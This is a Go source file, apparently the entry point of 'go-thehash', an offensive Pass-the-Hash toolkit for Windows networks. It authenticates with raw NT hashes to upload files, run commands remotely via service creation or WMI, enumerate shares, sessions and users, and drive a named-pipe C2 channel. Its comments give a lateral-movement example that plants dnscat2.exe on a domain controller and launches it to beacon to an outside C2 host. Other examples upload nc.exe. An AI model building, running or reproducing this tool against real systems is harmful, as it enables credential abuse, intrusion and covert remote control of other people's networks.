// go-thehash: Pass-the-Hash SMB/WMI toolkit.
//
// Authenticates via NTLMv2 using a raw NT hash (no plaintext password,
// no Windows SSPI). Supports SMB2 file operations, remote execution via
// Windows Service Manager (MS-SCMR) or WMI (DCOM), share/session/user
// enumeration via MS-SRVS and MS-SAMR, and the encrypted named-pipe C2
// channel against smbpipe-agent.
//
// ATT&CK: T1550.002 (Pass the Hash), T1569.002 (Service Execution),
//
//	T1047 (WMI), T1135 (Network Share Discovery),
//	T1087.001 (Local Account Discovery), T1021.002 (SMB/IPC$),
//	T1071 (Named Pipe C2 Channel)
//
// # Build (cross-compile to Windows)
//
//	go mod tidy
//	GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o go-thehash.exe .
//
// # Usage
//
//	go-thehash put       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
//	go-thehash get       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
//	go-thehash del       <target> <domain> <user> <nt-hash> <share> <remote-path>
//	go-thehash ls        <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]
//	go-thehash exec      <target> <domain> <user> <nt-hash> <command>
//	go-thehash exec-wmi  <target> <domain> <user> <nt-hash> <command>
//	go-thehash pipe      <target> <domain> <user> <nt-hash> <pipe-name> <command>
//	go-thehash enum      shares   <target> <domain> <user> <nt-hash>
//	go-thehash enum      sessions <target> <domain> <user> <nt-hash>
//	go-thehash enum      users    <target> <domain> <user> <nt-hash> [netbios-computer-name]
//
// # Phase 3 lateral movement example (IIS01 -> DC01)
//
//	go-thehash put  DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ "Temp\dnscat2.exe" ./dnscat2.exe
//	go-thehash exec DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "%COMSPEC% /c C:\Windows\Temp\dnscat2.exe --dns host=<C2>,port=53,domain=<domain>"
//
// # Source layout
//
//	main.go                    - usage + subcommand dispatch (this file)
//	internal/session/          - SMB connection via Pass-the-Hash
//	internal/fileops/          - put/get/del/ls over SMB shares
//	internal/remoteexec/       - exec (MS-SCMR service) and exec-wmi (DCOM/WMI)
//	internal/pipechan/         - encrypted named-pipe C2 channel client
//	internal/enum/             - shares/sessions/users enumeration (MS-SRVS, MS-SAMR)
package main

import (
	"encoding/hex"
	"fmt"
	"os"

	"go-thehash/internal/enum"
	"go-thehash/internal/fileops"
	"go-thehash/internal/pipechan"
	"go-thehash/internal/remoteexec"
	"go-thehash/internal/session"
)

func usage() {
	fmt.Fprintf(os.Stderr, `go-thehash - Pass-the-Hash SMB/WMI toolkit
ATT&CK: T1550.002, T1569.002, T1047, T1135, T1087.001

Usage:
  go-thehash put       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
  go-thehash get       <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
  go-thehash del       <target> <domain> <user> <nt-hash> <share> <remote-path>
  go-thehash ls        <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]
  go-thehash exec      <target> <domain> <user> <nt-hash> <command>
  go-thehash exec-wmi  <target> <domain> <user> <nt-hash> <command>
  go-thehash pipe      <target> <domain> <user> <nt-hash> <pipe-name> <command>
  go-thehash enum      shares   <target> <domain> <user> <nt-hash>
  go-thehash enum      sessions <target> <domain> <user> <nt-hash>
  go-thehash enum      users    <target> <domain> <user> <nt-hash> [netbios-name]

Arguments:
  target        IP address or hostname of the remote Windows machine
  domain        Windows domain name (use "." for local accounts)
  user          Username (e.g. Administrator)
  nt-hash       32-hex NT hash, no "0x" prefix
  share         SMB share name for put/get/del/ls (e.g. ADMIN$, C$)
  remote-path   Path inside the share (e.g. Temp\payload.exe)
  remote-dir    Directory inside the share to list (e.g. Windows\Temp)
  pattern       File glob pattern for ls (default: *)
  local-path    Local file path for put/get
  command       Full command string; wrap shell builtins:
                  "%%COMSPEC%% /c whoami > C:\Windows\Temp\out.txt"
  pipe-name     Named pipe name without \\.\\pipe\\ prefix (e.g. oraclexa)
  netbios-name  NetBIOS computer name for enum users (auto-detected if omitted)

Examples:
  go-thehash put      DC01 TESTLAB Administrator 41c46bf7... ADMIN$ Temp\nc.exe ./nc.exe
  go-thehash get      DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp\out.txt ./out.txt
  go-thehash del      DC01 TESTLAB Administrator 41c46bf7... ADMIN$ Temp\nc.exe
  go-thehash ls       DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp
  go-thehash ls       DC01 TESTLAB Administrator 41c46bf7... C$ Windows\Temp *.exe
  go-thehash exec     DC01 TESTLAB Administrator 41c46bf7... "%%COMSPEC%% /c whoami > C:\Temp\out.txt"
  go-thehash exec-wmi DC01 TESTLAB Administrator 41c46bf7... "cmd.exe /c whoami > C:\Temp\out.txt"
  go-thehash pipe     DC01 TESTLAB Administrator 41c46bf7... oraclexa "whoami"
  go-thehash enum     shares   DC01 TESTLAB Administrator 41c46bf7...
  go-thehash enum     sessions DC01 TESTLAB Administrator 41c46bf7...
  go-thehash enum     users    DC01 TESTLAB Administrator 41c46bf7... DC01
`)
	os.Exit(1)
}

func main() {
	if len(os.Args) < 2 {
		usage()
	}

	subcmd := os.Args[1]

	switch subcmd {
	// -- put -----------------------------------------------------------------
	case "put":
		if len(os.Args) != 9 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash put <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		share, remotePath, localPath := os.Args[6], os.Args[7], os.Args[8]

		session, err := session.Connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := fileops.PutFile(session, share, remotePath, localPath); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// -- get -----------------------------------------------------------------
	case "get":
		if len(os.Args) != 9 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash get <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		share, remotePath, localPath := os.Args[6], os.Args[7], os.Args[8]

		session, err := session.Connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := fileops.GetFile(session, share, remotePath, localPath); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// -- del -----------------------------------------------------------------
	case "del":
		if len(os.Args) != 8 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash del <target> <domain> <user> <nt-hash> <share> <remote-path>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		share, remotePath := os.Args[6], os.Args[7]

		session, err := session.Connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := fileops.DeleteRemoteFile(session, share, remotePath); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// -- ls ------------------------------------------------------------------
	case "ls":
		// ls <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]
		if len(os.Args) < 8 || len(os.Args) > 9 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash ls <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		share, dir := os.Args[6], os.Args[7]
		pattern := ""
		if len(os.Args) == 9 {
			pattern = os.Args[8]
		}

		session, err := session.Connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := fileops.ListDir(session, share, dir, pattern, false); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// -- exec (service) ------------------------------------------------------
	case "exec":
		if len(os.Args) != 7 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash exec <target> <domain> <user> <nt-hash> <command>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		command := os.Args[6]

		session, err := session.Connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := remoteexec.ExecViaService(session, command); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// -- exec-wmi ------------------------------------------------------------
	case "exec-wmi":
		if len(os.Args) != 7 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash exec-wmi <target> <domain> <user> <nt-hash> <command>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		command := os.Args[6]

		hashBytes, err := hex.DecodeString(hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] invalid NT hash hex: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[*] WMI exec as %s\\%s -> %s\n", domain, user, target)

		if err := remoteexec.ExecViaWMI(target, domain, user, hashBytes, command); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// -- pipe (named pipe C2 channel) ----------------------------------------
	case "pipe":
		if len(os.Args) != 8 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash pipe <target> <domain> <user> <nt-hash> <pipe-name> <command>")
			os.Exit(1)
		}
		target, domain, user, hashHex := os.Args[2], os.Args[3], os.Args[4], os.Args[5]
		pipeName, command := os.Args[6], os.Args[7]

		session, err := session.Connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n", domain, user)

		if err := pipechan.ExecViaPipe(session, pipeName, command); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	// -- enum ----------------------------------------------------------------
	case "enum":
		if len(os.Args) < 7 {
			fmt.Fprintln(os.Stderr, "Usage: go-thehash enum <shares|sessions|users> <target> <domain> <user> <nt-hash> [netbios-name]")
			os.Exit(1)
		}
		action := os.Args[2]
		target, domain, user, hashHex := os.Args[3], os.Args[4], os.Args[5], os.Args[6]

		session, err := session.Connect(target, domain, user, hashHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}
		defer session.Close()
		fmt.Printf("[+] Authenticated as %s\\%s\n\n", domain, user)

		switch action {
		case "shares":
			if err := enum.Shares(session, target); err != nil {
				fmt.Fprintf(os.Stderr, "[-] %v\n", err)
				os.Exit(1)
			}
		case "sessions":
			if err := enum.Sessions(session); err != nil {
				fmt.Fprintf(os.Stderr, "[-] %v\n", err)
				os.Exit(1)
			}
		case "users":
			netbiosName := ""
			if len(os.Args) >= 8 {
				netbiosName = os.Args[7]
			}
			if err := enum.Users(session, netbiosName); err != nil {
				fmt.Fprintf(os.Stderr, "[-] %v\n", err)
				os.Exit(1)
			}
		default:
			fmt.Fprintf(os.Stderr, "Unknown enum action: %s (choose: shares, sessions, users)\n\n", action)
			usage()
		}

	default:
		fmt.Fprintf(os.Stderr, "Unknown subcommand: %s\n\n", subcmd)
		usage()
	}
}
